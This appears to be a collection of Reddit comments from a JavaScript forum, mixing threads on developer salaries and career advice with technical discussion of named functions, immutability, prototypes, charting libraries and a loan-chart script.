Had to make an anon account for this (should've done it a long time ago). But here are my experiences: 1. I currently make a little over `100K` in Texas. For 100K, I can buy a small mansion in the suburbs. I'm a JS back-end/front-end developer and I have about 4 years of professional dev experience 2. Last year, I severed a contracting job that paid me `double what I make now`. It was for a company in the bay area. They were getting a cheap deal, I was getting a great deal. 3. I have a friend who lives in the same area as me and has about 8 years worth of dev experience (including leading a team). He's all JS now and makes around `$300K` with bonuses. BUT, he has to travel 2 weeks out of the month, every month. He's not some JS guru either, just a great programmer with JS skills. 4. When I worked with this guy at the same company, having similar responsibilities, he made about `35K more` than I did but with little cash thrown toward raises each year (negligible). 4. When I started out, I contracted at `$25/hr` with barely any professional experience at all. 5. Six months into my work status, I made `50K`, a year later `60K`, a year later close to `100K`. 6. I'm currently a team lead on a small dev team and had to hire a new JS developer. He makes close to `80K` with only 2 years of experience. But after 2-3 months of searching, he was the best candidate who could actually do the job. He lives in the same area as me. 7. I've been offered jobs that pay around `$200K`. I didn't take them and most of them were remote. But they required constant travel. I have a kid so that just doesn't fly with me. Phew, glad I could finally get this off my chest.
Hook me up with a job in NC please. :p 
Yeah, I can totally see why this lib would be useful in fact. Sorry for coming off as a bit of an ass before, I had just woken up and didn't put much thought or time in my post, and that's not a nice thing to do. I'm just going to correct that previous post, keeping the intent but formulating things in a way that is less aggressive as to not detract potential users who would just have a cursory glance at what I wrote.
Or writing map/reduce jobs for a Riak cluster. (Though that only as a stepping stone to using Erlang to do the same)
I demand you play [this](https://www.youtube.com/watch?v=eWM2joNb9NE) in the background. 
I'm doing my best to neutralize those factors as best as I can. - I own my home - drive electric - eat at home as much as possible - I live in the east bay so the city's expenses don't touch me
As an east coast dev, I'm curious as to what your total compensation is? If you don't mind sharing :)
Hey, just want to thank everyone for contributing. A lot of what I've learned was moving calculations outside the loop if possible. This really sped up the chart drawings. I think I need to run a debugger like a few people suggested, which I will work on later today.. Here is the full javascript file for anyone interested, some people were asking for more detail. function round(num, dec) { return (Math.round(num*Math.pow(10,dec))/Math.pow(10,dec)).toFixed(dec); } function start() { $(function () { var loan_amount = 500; var interest_rate = 1; var loan_term = 10; var loan_amount = document.getElementById('loan_amount').value; var interest_rate = document.getElementById('interest_rate').value; var loan_term = document.getElementById('loan_term').value; i = interest_rate/100; var months = loan_term * 12; var monthly_payment = loan_amount*(i/12)*Math.pow((1+i/12), months) / (Math.pow((1+i/12), months) -1 ); var line_chart_data = []; var bar_chart_data = []; var current_balance = loan_amount; y = 2014; year_end_number = y + loan_term + 1; month_number = 0; month_end_number = (loan_term * 12) + 1; monthly_interest_rate = i/12; while (y &lt; year_end_number) { m = 1 y++ while ((m &lt; 13) &amp;&amp; (month_number &lt; month_end_number )) { line_chart_data.push({month: y+'-'+m, item1: round(current_balance,0)}); bar_chart_data.push({y: y, a: round(current_balance,0)}); current_balance = current_balance - monthly_payment + (current_balance * monthly_interest_rate); month_number++ m++ } } //LINE CHART var line = new Morris.Line({ element: 'line-chart', resize: true, data: line_chart_data , xkey: 'month', ykeys: ['item1'], labels: ['Balance'], lineColors: ['#efefef'], lineWidth: 2, hideHover: 'auto', gridTextColor: "#fff", gridStrokeWidth: 0.4, pointSize: 0, pointStrokeColors: ["#efefef"], gridLineColor: "#efefef", gridTextFamily: "Open Sans", gridTextSize: 10 }); //BAR CHART var bar = new Morris.Bar({ element: 'bar-chart', resize: true, data: bar_chart_data , barColors: ['#efefef'], xkey: 'y', ykeys: ['a'], labels: ['CPU'], gridTextColor: "#fff", gridLineColor: "#efefef", hideHover: 'auto' }); }); }
It says NC, and a random guess would be somewhere in Research Triangle Park. I've been to JavaScript meetups there.
I know it says NC. as someone else from NC, you just say "state" and it's implied that you're asking about NCSU (North Carolina State University), the big public school that is well known for engineering, not asking which state of the country. Sorry for the ambiguity 
Got it thanks for explaining!
I like `const` and use it, but I look forward to the day it really means constant in all environments. Currently in most environments, babel/traceur will just convert it back to `var`
I've been too high to code plenty of times ;)
Do you mind sharing where you work (via pm if necessary)? I've got 10 years industry experience, two years as FT js dev and am substantially lower while working in pdx :(
netflix?
Sure (this is a throwaway, so :) ) My annual bonus is ~10% of my annual salary, 50% of it being determined on my companies performance and 50% determined by individual performance. (My past 2 jobs have done something like this) Every year I am granted restricted stock that vests over 4 years (aka the golden handcuffs). This past year I was given $35k which will vest over the next 4 years. This number is cumulative, so presumably if I make it to 4+ years, I'll get ~35k per year in restricted stock. My 401K matching is only 4%, which is pretty low (but I've had lower.. so :/) I have very good benefits... exactly what you would expect working at a giant corporate company. --- So, everything combined brings me to ~159k (to 185k with a fully vested stock plan). Cost of loving in the Bay area drops my actual gains by a lot... but yea, this is what I am currently making. --- I've worked in NYC for a major ad agency, pretty much made garbage... but, I had substantially less work experience (I was still in college.)
You're not being paid enough. Yahoo paid interns the equivalent of $66k in 2008 in the Bay Area. :(
Well, of course the Googles and Yahoos of the world will pay a lot more--even to their interns. I don't work for a large company, and I'm not sure I would enjoy working for one either. Certainly I would love more pay, but I'm pretty satisfied with what I'm making, especially just a year out of college. Honestly, I think 100k+ starting salaries are ridiculous for this field. I mean, we're not physicists or aerospace engineers. We're web developers, and I think 70k for a starting salary is damn fair
Actually, every feedback is good! It means the documentation needs more useful examples. And it might need extra/better functionality. For me, the standard Javascript regex functions scare me off. In your first example, if it would be slightly more complicated (using capture groups), it would have required the exec function or even replace instead of match. Not very intuitive imho. My goal is an api that easy on the brain.
lol
lol at all the plebes downvoting me who suck at people and wonder why all the top 10% of high paying jobs have a significant management roles. Honestly, who the fuck would pay you guys to do mid-low level dev work at the rate of a 30-40 year old with kids and a mortgage when they can pay 75% less for 25% less performance from somebody right out school? Hell the person right out of school might have a better grasp of the newest concepts and workflows than you! Y'all are fucking kidding yourselves.
Ugh, that's closer to what I get every ten+ days in central London.
Don't forget that Texas doesn't have a state income tax, which changes your disposable income pretty significantly.
Thanks a ton for this...very insightful. Would you be up for writing a guide towards making sure a fledgling developer is doing what he/she can to continuously earn a higher income over time? I have been a paid web developer for almost a year. 
Lol
The obfuscated JS code is at line #100 in the HTML code.
I'm a JS/TS + C# developer in a small startup in Alberta CA and I'm not higher than you are.
But the data isn't comparable. Say you survey the compensation of a sample of 50 straight men and 50 gay men. The situation is different for every single one of them. Different job specifications, different company sizes, different company revenue, differing seniority, etc. There is no control figure for what the salary should be, because it's pretty much a number plucked out of the air during negotiation between employer and employee. Therefore that 18% delta could easily be dismissed as coincidental.
And salary ranges depend on full compensation packages. Benefits, annual bonuses, stock grants, and equity are all very important pieces to the puzzle. Contract work will net you a higher salary, but you'll likely end up losing out on bonuses, benefits, and job stability.
Maybe I'm missing something (okay, I'm almost certainly missing something), but why would you want to do that directly in JavaScript? The idea of exposing the LDAP structure that openly gives me the heebie jeebies. Well, unless this is a way of giving developers and DevOps people an easy way to use some AJAX to throw together an LDAP front end for internal use, in which case that's actually really cool.
It depends where you live, benefits, etc. I moved and make 30% more, but cost of living is higher. 50k for 3 years experience of front end dev in a second tier city (not SF, NY, LA, etc) isn't bad. I have never had nor heard of any significant raises given to any developer. The only way to get a raise is to get a new job. If you want significantly more money, start looking. 
Is there any reason to justify the removal of the post?...
&gt; why would you want to do that directly in JavaScript? You can react to changes and do custom actions without writing a C plugin to OpenLDAP. For example, when an account is deleted, you can make a bunch of REST calls to de-provision services for that user. Or you could add some dynamic checks to user authentication. Or maybe a legacy system only speaks LDAP and your main user management system is based around a REST API. You can write an LDAP transport for your user management system to support the legacy system.
&gt; Immutability came up very fast in JS and those who haven't code in function programming languages yet aren't ready, yeah? :) I'm not sure what you mean here. Immutability is not unique to functional programming, but fp does tend to promote immutable structures. The upside for immutability is knowing no other thing will have side affects on whatever data structure you are working with at any given point in time. The downside, however in JS land, is that cloning objects and structures, in order to have immutability causes hidden classes, garbage, and triggers GC pauses in the browser. As much as I love immutability, it can be hard to justify writing functions that return new objects given some input object given the current state of JS in the browser. It's more performant to reuse the same object and modify its key value pairs.
Ah-HAH! So it is the second option! I can see why someone would want to do that, since adding functionality is going to be a lot easier in JavaScript than trying to rewrite and recompile in most traditional languages.
Because I've done it before several times.
Well, for JS usually you have some kind of build system to package files and add documentation or whatever you want, which C# and Java also have. Also, C# and Java are both easy to set up for adding a web service, just like JS is with Express. So, it really just comes down to language preference.
It's less a hierarchical thing than a sibling thing. All Objects can be considered to be at the same level (because they *are*), with some having pointers to others: an object's prototype (if it has one) is just another object. It doesn't mean the prototype is more "important" in a parent / child sense and methods inherit *from* it, but that an object can say "I don't have a method `foo` but I have a link to an object that might that I will run when asked" (delegate *to*). You can make your own objects that delegate methods from any other object without the object you grab a method from having anything to do with your one or knowledge that it even exists.
Actually no, in Belgium and many other EU countries for instance there's a big shortage of IT trained people right now. And companies are starting to hire more and more because they're finally seeing the value I guess. The pays are also quite competitive, but nowhere near US levels. We have our tax immediately subtracted from our salaries, and that's not just a 'little' tax. We're talking 25% up to 50% depending on your job. So devs might have a paycheck of 60K but end up with 30K of actual money they get to spend on rent and food. The benefit is that you get near free healthcare and education and pretty okay pensions.
Read Secrets of JavaScript Ninja by John Resig - "Creator of jQuery"
&gt; Your estimation of "75% less money for 25% less performance" is off by a very long shot. Not off at all. Why do 45 year old VPs in NYC make 250k+ a year? Why do do freelancers make 125/150? Because being able to manage large pools of expertise across many people is a more valuable skill than offering expertise as an individual. As I said, everyone can downvote me all they want but I think at some point you're going to realize your salary is capped as a freelancer no matter how much "expertise" you offer because your skills, ultimately, need to be managed by someone with a grasp of the bigger picture, or with a talent for GROUPING expertise so that huge projects can go off without a hitch. 
Anyway, immutability as a primary feature was never used outside of fp languages. And, of course, immutability is not a silver buller of programming (e.g. games and real-time apps need mutability), but it's extremly useful in general.
Uh, you were comparing a VP vs a freelancer? That is comparing apples to oranges, and completely unrelated to the subject discussed (which was experienced vs inexperienced developers).
[Free Code Camp](http://www.freecodecamp.com/) When its course coverage needs supplementing ...it tells you where to go read up.
If D3's browser support is an issue, the obvious alternative would be Raphael. I've written charting frameworks built on top of Raphael before. The easiest way is to create 'shape' classes that handle their own drawing and abstract away the details of the element, and then create a view that composes a chart out of multiple shapes. The view iterates over the members of a viewmodel to work out what shapes exist and how they're positioned in relation to one another. One of these days I'll open source the work...
If you've got the experience - i.e are a senior dev, interview well and don't mind moving around frequently and doing basic accounting, contracting makes so much sense right now in London. It really is a developer's market.
The US isn't some panacea of low taxes! A software developer in SF making $150,000 is paying about 31% to the IRS + 9.3% to the state of California. That money gets taken out of every paycheck automatically.
Understood. Now I see where the video went wrong. The graphics suggested that it *is* a hierarchal thing when really the class, subclass thing is just a way to organize siblings.
IN terms of years experience, a 35-45 year old can make vp. The people bitching in this thread about not being respected for never wanting to go management and up sound unbelievably naive. 
Jesus I feel like I went wrong somewhere in my career. I only made $72k at a startup and I have been doing this for 15 years. Now I'm looking for new work and I have no idea what to do anymore. 
Not everywhere. Sexual orientation is a protected class in 22/50 states, and gender identity in 19 of those 22 states. You can see the map here: https://www.aclu.org/map/non-discrimination-laws-state-state-information-map
Why are the salaries so low? Is it due to the costs of various additional regulations and programs that are in place for German workers, like paid parental leave or increased holidays?
On the other hand, you seem to be saying everybody should be a VP or else be prepared to be considered of no value, which sounds unbelievably ridiculous.
From what I've heard/read from people who work at the Amazon's, Microsofts, and Googles of the world is that you're getting paid that much because you usually have the responsibility of 2 or 3 normal people.
I was a journalist. Since I didn't start coding (really, I started with HTML/CSS, then PHP, then Javascript) until I was in my 30's I had to spend a number of years ramping up. It wasn't until I was in my later 30's that I had enough work to make a living of things. In 10 years I see myself as a lower level executive (I am a lower level manager sort now... lots of coding but also managing small teams, estimating projects, attending planning meetings, etc.). My only goals are to continue to learn and grow my skills, make enough money to live a decent middle class life, take care of my family and save (I'm quite frugal... had to be as for many years my income was quite lean... so this is easy for me). Not looking to be a high powered executive, not interested in the financial risks of starting my own business. Just interested in doing something I enjoy, constantly learning and continuing to lead a happy family life while maintaining a sufficient level of financial security.
Wow great insights from everyone. I had no idea that these salaries were actually the norm for this industry. It's also interesting learning that the development culture in Europe is different than here.
You certainly haven't got H1B visas "several times", unless something really funky was afoot.
Not to mention, if you don't have a US degree the probability of getting a visa is much smaller. 
$50k is about right if he *only* knows javascript though (i.e. entry level).
I make between $90,000 and $100,000 (Salaray + Bonus) doing mostly javascript for a well-known financial company in Detroit, MI.
i've used http://www.chartjs.org/ in the past with successful, is simple and works very well
&gt; var Δ = { Clever. Also: 'Weeoo'?
And that's been a problem all along. The use of classical OO terms leads devs to expect certain behaviour and then dick about with code to attempt to fully replicate that behaviour. This mostly doesn't work or fails in annoying ways so they then blame JavaScript for being a useless language when their original premise was at fault. There's no type checking. There's no classes. There's no inheritance. Just objects linked together. All the bibble about classes in ES6 is just syntactic sugar hiding what is going on. If you look at what TypeScript (for example) outputs when it "compiles" you'll see assigned prototypes, "inherited" methods and all that jazz attempting to emulate classical OO in a language that doesn't have it in the first place. Where people fall down is what TypeScript tries to fix: it produces boilerplate code that works as well as it can without the developers needing to try and do it themselves (and most often, getting frustrated that bits get missed / don't work as "expected"). Type checking is done using helper functions. The flexibility is both its greatest gift and its greatest curse: you can bend it (almost) to your will to emulate all kinds of inheritance patterns. Yet it is still just linked objects under the hood. See also arrow functions. They are just functions written in a different way. No name given? You get an anonymous function, same as always.
Nope.
As a Java developer with 2 years of experience who makes ~ 27 K € I say.. Wtf are those wages..
in general try and learn to recognize and avoid the 'political' or ideological stuff... there are a lot of strong opinions and not a lot of absolutes... don't let anyone dissuade you because javascript "isn't a real programming language"... (though it does do so really weird stuff from time to time that's worth knowing about) you don't need to pick sides in the framework jumble just yet, and don't let anyone tell you what "the right way" is... if it runs in Chrome/firefox/ or node and does what you want, it's good enough for starters... once you're comfortable there feel free to try a little of everything or just what suits your immediate needs, and you don't strictly need any framework... so don't think you do if they're not for your
that sounds kinda unreal. what's your actual pay, not counting stock compensation or anything else. how much actual cash do you make?
You won't "beat" adblock plus (precisely).
What in particular about adblocker isn't good enough? To answer your question: you're probably going to need to know a lot about DOM traversal and manipulation. Assuming you have at least a rough project plan, I'd just jump straight into it. Write a test/hello-world extension first. Then start putting your code into it. That said, there's a good chance that the extension itself is the tip of the iceberg. You're probably going to have to manage server and ip white lists, black lists, user exception lists and develop ad heuristics, on an ongoing basis. 
Keep in mind that these 40% include medical insurance and our taxes pay for schools and university.
It's semantics for things that go weeee ooooo weeee ooooo
I graduated from a Portland-area code school recently and immediately got offered a job in town as a JS/Angular dev that pays $62k + 5-7% annual bonus + benefits + 401k and profit sharing after one year. I had interviews with other places that paid less and had worse benefits so I think this job is on the higher end for someone with my background (non-technical, fresh out of code school) but it's hard to say.
I don't want to "beat" adblock plus but it isn't clear how it works, with the white-list...
It'll be for personal use I think I am note sure if i put it on the chrome web store.
Compared to US, Indian's get too low salary. Even 5year experienced front end guy will be able to earn $20k to $30K per annum. I didn't saw anybody earning beyond $30k here in India.
One reason being that it is not easy to get a visa to move to the US.
You didn't do anything wrong. Things often just "end up" this way. I definitely wasn't looking to make what I make right now in the beginning. At one point, I made 60K and thought, "this is it, this is my peak". Then I applied at some companies and by *some* fluke, the company offered 90K. I ended up in a weird situation so I didn't take the job but ever since then, I always look for 20-30K more with every job. Even if I don't get it, I get a good feel of the market. Read [Talking About Money](http://www.kalzumeus.com/2015/05/01/talking-about-money/), it covers these kind of situations really well.
Maybe try paper.js http://paperjs.org/examples/hit-testing/
`const` variables and immutable data are almost completely orthogonal concepts. And almost *all* of the benefits of reasoning you get in FP are from the immutability of data not the const-ness of variables. Other than globals, variables in almost all programming languages have short lifetimes, and in any one scope there are a fixed number of them, and they can only be rebound by code within that lexical scope. There is no call-by-reference in JavaScript (`&amp;` in C++), so if you declare `foo` somewhere, you know exactly where it can be rebound, and can easily inspect it yourself. *This is exactly why the compiler can give you an error at compile time if you use const incorrectly.* Immutability, on the other hand, is unrestricted. You may create an object in one piece of code, but the moment you start passing references to that object around, by passing it as a parameter to code somewhere else, by accessing it dynamically with `[]`, or by assigning it to the property of some other object, you lose the ability to inspect a fixed portion of the code to determine whether the object has been mutated. Unless you implement *global* guarantees that apply to your own code and all the code in every library or module you employ, you cannot be certain that you do not mutate the object. Thus, things like `.freeze` or declaring a property to be gettable but not settable are runtime-checks, because it is not feasible to make a compile-time guarantee. tl;dr: `const` is property of a fixed and finite subset of the program that you control. Immutability is a property of the entire program, and in the general case, you cannot control it.
aaaaaaaaand GO!!
&gt; Tech salaries in general are crazy - we definitely don't deserve it. We deserve it in the sense that there are too few of us to satisfy the market.
sockets
The key is practice.
Is this true? I live in Australia and would love to get a remote job.
Hm, let's try that after 6 months
I've been considering starting an anonymous blog discussing these sort of "behind the scenes" things. But here are some tips: 1. Staying up to date with technology is pretty much the best thing you can do as an early dev - career-wise. Experience with a specific tech that a company is looking for trumps other experience. A dev with 15 years of .NET has less of a chance of getting a JS job than a Jr. dev with 1 year of experience with JS. Makes sense? Same goes for Angular, React, Node and any other related tech. 2. Every job you get after the one you have right now should have a substantial salary increase. Anywhere from 15-20%. Keep up that goal. 3. As terrible as it sounds, don't stay at a job for longer than 1-2 years when you're starting out. Companies rarely ever (read: never) provide employees with opportunities of substantial growth and learning. And substantial compensation increases. Once you get somewhere where you're *comfortable*, look for a long-term job. 4. *Move* with technology. If you're no longer a Jr. dev, try to see the patterns of what's becoming the next best thing and *why*. Learn the technologies that will help you at your current job and this way you'll naturally grow into your next position. For example: I had to learn Angular for prototyping at a job, it was a great way as a back-end dev to show off new APIs and features to the front-end devs. My next job after that was Angular-only. My current job is Angular + Node while slowly transitioning to React/Flux due to Angular's limitations. My next job? Probably something to do with isomorphic apps. 
Glad you mentioned rent. I live in Louisiana and make 50% what you make, but my 2200 square foot home's mortgage is 1/4 of what your rent is I'm sure (1200/month). Weird how this stuff almost evens out.
Are you speaking from experience?
Since it is a throw away, what company?
very interesting, thanks for sharing
Really appreciate it. Would you recommend the use of Typescript to help deal with "classes" and "inheritance" ?
This is almost my exact experience, minus the previous contracting works. I work in the Dallas area, 4 years experience, make 110k, full benefits. Started at 55, then got a raise to 62, then 80, then another bump to over 100k when I got named a senior dev. All told, in my opinion for tech related areas, there's nothing better than the Dallas area right now. No state income tax, low-to-average cost of living (especially compared to Seattle, the Bay Area), etc. 
Dallas, Austin, or Houston, to be honest. Housing is cheap as hell in all of those cities and they all have a sort of "dev scene". Anyways, howdy, partner!
A simple social network is great for this, but requires you to learn Node.js for the server.
d3.js has an array of child projects. You don't always have to build from the ground up... [nvd3](http://nvd3.org/) [dc.js](https://dc-js.github.io/dc.js/) [c3.js](http://c3js.org/) [xCharts](http://tenxer.github.io/xcharts/) [dimple](http://dimplejs.org/index.html) [Vega](http://trifacta.github.io/vega/) 
Cringey title
I'm a senior dev with all kinds if experience, but have been doing mostly js for the past several years. I make $125k in the Denver metro + $15-25k in bonus and equity. I think the base pay is about average and the extras are on the high side for senior devs at large companies in the area. Smaller shops and startups seem to pay much less ($110-115 base for senior devs) and require more hours, so I'm not sure what the appeal is. Denver has middle if the road cost of living (but it's rapidly rising). Less than CA or NY, but a lot more than Texas. I'll take a high salary and 40 hours a week at a soul sucking faceless mega corp over crappy pay and long hours at a "change the world" startup every time. Big corps know you're just there for the money and are ok with it, while smaller orgs often expect you to dedicate your life to their cause. I have been offered similar salary amounts for remote work from Silicon Valley companies, but I don't think I'd like remote work.
I'm not refuting the worth of the study. What I'm saying is, you can't deduce a correlation of sexuality based on that data, because there are *so many* other (more consequential) factors at work. Say hypothetically there were a bunch of gay people who were on $200K+ salaries that skewed the results, and the 18% difference was reversed. Can you say it's indicative of sexuality bias that gay people make more money than straight people? No. Just some people make more money than others.
Oh I didn't know that, it's probably because I'm used to the idea that I can work in every country I want because free flow of people and money but that's only the eu :p
That is certainly true. Although TypeScript isn't Java either. 
I guess social network would be a great example, but being a new with javascript, learning node.js will be very hard. But, maybe after some time.
Thanks, I'll check this out.
What should be the type of a number that represents "an undefined or unrepresentable value"? It is numeric in every language that implements the IEEE 754 standard for floating point numbers.
95k + bonus + benefits. I work remote. 
I would recommend taking the git/github course prior to it if you're not familiar with git. You'll more likely than not need to learn this at some point, and it'll be a good way to start building your github profile by adding these projects to it. 
I would say that there are no issues. I usually name my anonymous functions if I need to do recursion.
I'm going to have to keep this in mind for the future! Good point I hadn't considered. The only reason I *might* think of it as a problem is that the function will actually get hoisted like this (I believe), but that shouldn't really matter.
Thanks!
Es6 does default params and has native promises, which are wonderful. between it and yield, async stuff won't be that bad. Fuck yeah to an "or equals" operator. Love to be able to do If (num == 3 ||= 4)
In addition to stack trace legibility, named anonymous functions are much nicer for unregistering event handlers button.addEventListener('click', function handleClick(e){ this.removeEventListener(e.type, handleClick); // ... handler logic });
&gt; every language that implements the IEEE 754 standard for floating point numbers So, basically every mainstream programming language. :) In addition to `NaN`, [IEEE 754][wiki] also defines representations for `Infinity` and `-Infinity`. I think having representations for these things provides the property of *closure* in JavaScript's Number type for the operators +, -, *, and /. In other words, you can infer the type of some a * b, where a and b are both `Number`s, even if you don't know their values. So in JavaScript, `Infinity * 0` is still a Number, even if it's `NaN`. [wiki]: http://en.wikipedia.org/wiki/IEEE_floating_point
CodeAcademy was an excellent primer for me to get me used to the syntax and structure, but I've heard having experience in another language is preferred. I don't think it could teach anyone JavaScript, but I'd recommend it as an exercise that should take no longer than a week to get your feet wet and make digesting proper literature on JS a little more easy.
I think its tough to stick with one single project in the beginning, especially if you want to learn a lot. So you might just try short simple projects and when you get bored move on. But here is another idea. First project, get this set up BDD in the browser: http://jasmine.github.io/2.0/introduction.html Then create a robot module or class that displays itself on a 2d canvas. Then add some behavior for you robot and verify each function with Jasmine tests so you can automatically make sure your robot does what its supposed to even as you evolve its code design. Also, take a look at babel.js so you are aware of differences between es5, es6 and es7/etc. Main thing is to play around so I think if you are too frustrated its ok to start a new project if it is interesting to you that day. You will learn a lot that way. Also see Khan Academy Javascript and/or Codeschool. Also see Codepens with games you can edit the code for http://codepen.io/tag/game/
I have been in github for 2 years now. I'm ok with it. But thanks :)
Ok, I'm saving this for latter visits. And thanks for letting me know about jasmine
I believe IE6 doesn't like it (similar to the trailing comma on objects). Aside from that, it's very practical and I enforce it during code review. It's actually not all anonymous functions. It's any inline function that lacks a left-hand assignment. For example, these will have a names in a stack trace: var hello = function () {}; var foo = {bar: function () {}}; Here is a CodePen that does a full demonstration (I created this as part of a JSCS issue): http://codepen.io/twolfson/pen/ByLRwP And here is a JSCS rule that enforces these functions are named: http://jscs.info/rule/requireNamedUnassignedFunctions.html
You do *not* need named functions for recursion. See: the [y combinator](http://kestas.kuliukas.com/YCombinatorExplained).
It reminds me of [After Dark's "Rose" screensaver](https://www.youtube.com/watch?v=pSKqpTCCyDs).
Primarily for historic reasons. There are issues with IE8 and below. http://kangax.github.io/nfe/
Unless you're seriously suggesting that this technique should be used in production code, my point stands: You *need* named functions for recursion.
You can see the proposals to ES7 here: https://github.com/tc39/ecma262 And transpiler support for those features from Babel (or Traceur if you want to find those (or Typescript which has limited stuff like async))) here: https://babeljs.io/docs/usage/experimental/
Things are going to be even worse in the future, because arrow functions can't be named at all, so they will always be anonymous and therefore difficult to see both profiling and stacktraces.
You are right. This is a great source on this topic: https://kangax.github.io/nfe/
Avoid using anonymous functions. Instead use bind to call a callback handler. This helps tremendously with unit testing as you can test each individual function instead of a cascade of related events.
I use function names too. I was wondering though... are there any preprocessors that automatically fill the function name? E.g. if you have `var handleClick = function(){ }` then that could be converted to `var handleClick = function handleClick(){ }`.
Originally you could not have "anonymous" functions with a name. Some old browsers still don't support it. obj = { somefunc: function somefunc(a) { } }; would then produce a syntax error. 
What you want is [getElementsByClassName](http://www.w3schools.com/jsref/met_document_getelementsbyclassname.asp) and [getElementById](http://www.w3schools.com/jsref/met_document_getelementbyid.asp).
Well, if you give it a name, it's not anonymous anymore, is it? But the code that you are quoting shouldn't be an anonymous function anyway. leaving the name out is only good if your function is obviously correct, and very short. IMO it's very bad idea to use complicated function without a name.
I wish the errors included column numbers so that they could be mapped directly back to the source by an IDE.
Wait could you not do: const functionName = (params) =&gt; { // Random stuff; functionName(); }; I get that this doesn't actually name the function though but arrows can still be used for recursion. 
naming things is hard :(
There is one problem I've encountered while using this style: var a = 1, b = function a() { console.log(a); }; b(); In this example the value of 'a' inside the function scope is the function and not '1'.
It is a expecting too much for a SPA site to not crash my browser? I am dissapoint. 
You should look up for recursion, to see what it actually means. Here's a SO answer that might help http://stackoverflow.com/questions/5164039/javascript-recursion Word of caution: Once you learn it, you will like to use it everywhere, and it's not always optimal (look at fibonacci examples for more information about this).
Some example I wrote a while ago: function delayed(msec, computation) { return new Promise(resolve =&gt; setTimeout(() =&gt; resolve(computation()), msec) ); } function timeout(msec, promise) { return new Promise((resolve, reject) =&gt; { let id = setTimeout( () =&gt; reject(new Error(`timeout: ${msec} msec exceeded`)), msec ); promise.then(v =&gt; { clearTimeout(id); resolve(v); }); }); } var p1 = delayed(100, () =&gt; 'ohai'); timeout(1000, p1) .then(v =&gt; console.log(v)) .catch((v) =&gt; console.log('oh noes')); With Dart, timeout is a method of "promise" (Future) instances, which returns a new "promise". So, you can just write someAsyncThingy().timeout(duration).then(...), which is kinda handy.
This is reddit. Up/downvotes mean nothing.
IO in haskell is modeled with a monad, as well state can be modeled with a monad. The key is that monads aren't about state, but can be used to model it.
Same answer. It's the norm for reddit. You have to remember that most people on reddit are kids under 18 whose sole purpose in owning a computer is to play games. Take it all with a grain of salt.
Do they not teach this in school? Which school is this? So others can be warned not to go there.
I used tobe a programmer like you, till I took an arrow function to the knee.
Static as in, their coordinates do not change.
&gt; **Vote.** If you think something contributes to conversation, upvote it. If you think it does not contribute to the subreddit it is posted in or is off-topic in a particular community, downvote it. -[Reddiquette](https://www.reddit.com/wiki/reddiquette) I would guess that some people think asking stupid questions doesn't count as contributing. :)
Looks good!
You get that much in Brisvegas? And here's I've been pining away in *a shitty little country town* in -5 degree weather for that same contracting rate!
/u/drowsap is probably referring to the idea that with bind you're able to control the scope and leading arguments of a function e.g. handleClick(e) { // this == button // e == NotAnEventObject } button.on('click', handleClick.bind(button, NotAnEventObject)); Personally I've found that it looks clever, but ends up signifying that whoever wrote it either doesn't fully understand callback scopes or prefers to cut corners. I'm including myself in that assessment BTW. :)
Hello Captain: https://en.wikipedia.org/wiki/Gerrit_Rietveld I'm a big fan.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Gerrit Rietveld**](https://en.wikipedia.org/wiki/Gerrit%20Rietveld): [](#sfw) --- &gt; &gt;__Gerrit Thomas Rietveld__ (Dutch pronunciation: [ˈɣɛrɪt ˈtoːmɑs ˈritfɛlt]; 24 June 1888 – 25 June 1964) was a [Dutch](https://en.wikipedia.org/wiki/Netherlands) [furniture](https://en.wikipedia.org/wiki/Furniture) [designer](https://en.wikipedia.org/wiki/Design) and [architect](https://en.wikipedia.org/wiki/Architect). One of the principal members of the Dutch artistic movement called [De Stijl](https://en.wikipedia.org/wiki/De_Stijl), Rietveld is famous for his [Red and Blue Chair](https://en.wikipedia.org/wiki/Red_and_Blue_Chair) and for the [Rietveld Schröder House](https://en.wikipedia.org/wiki/Rietveld_Schr%C3%B6der_House), which is a [UNESCO](https://en.wikipedia.org/wiki/UNESCO) [World Heritage Site](https://en.wikipedia.org/wiki/World_Heritage_Site). &gt;==== &gt;[**Image**](https://i.imgur.com/BTVMDP6.jpg) [^(i)](https://commons.wikimedia.org/wiki/File:Gerrit_Thomas_Rietveld.jpg) --- ^Interesting: [^Gerrit ^Rietveld ^Academie](https://en.wikipedia.org/wiki/Gerrit_Rietveld_Academie) ^| [^Wim ^Crouwel](https://en.wikipedia.org/wiki/Wim_Crouwel) ^| [^Van ^Gogh ^Museum](https://en.wikipedia.org/wiki/Van_Gogh_Museum) ^| [^Emmy ^van ^Deventer](https://en.wikipedia.org/wiki/Emmy_van_Deventer) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+crrto2h) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+crrto2h)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Somewhat related question I asked a while back on StackOverflow: http://stackoverflow.com/questions/15530374/using-named-immediately-invoked-function-expression-iife-instead-of-comments
Almost all of us can safely ignore it not. But not quite all of us. China is still &gt;3% usage of IE. https://www.modern.ie/en-us/ie6countdown
&gt; running scripts on the server The code executes locally, but this doesn't mean it is executing on a server. It executes in Nodes runtime environment. Its not really that different from any program that runs in your OS. You can, of course, run a server from Node, but it is by no means necessary to get huge benefit from it.
Why don't you hardcode year 2010 if that is all you need and you're having difficulty learning JS?
?In the fixed calendar code, Angular with React is still quicker.
 var data = google.visualization.arrayToDataTable([ ['Task', 'Hours per Day'], ['Work', 11], ['Eat', 2], ['Commute', 2], ['Watch TV', 2], ['Sleep', 7] ]); var options = { title: 'My Daily Activities' }; Update this. Keep the rest the same. Try not to be too lazy.
I kinda wish there was a simple way to test for null, undefined, '', nan, etc but that's a entirely different thing than the or equal operator
Take a look at mine here : [orrery.com](http://orrery.com) The code is on github, but it's been a while since I worked on it... there are some things there that make me cringe, even if it's only a few months old. That's one thing you'll learn, how fast you evolve as a programmer. And it never stops.
Write a test harness for command line unit testing scenarios.
When you started out how did you get 20/hr job, I'm in similar position. 
curious, what can you even accomplish in 12 weeks, meaning what company only needs someone for 12 weeks
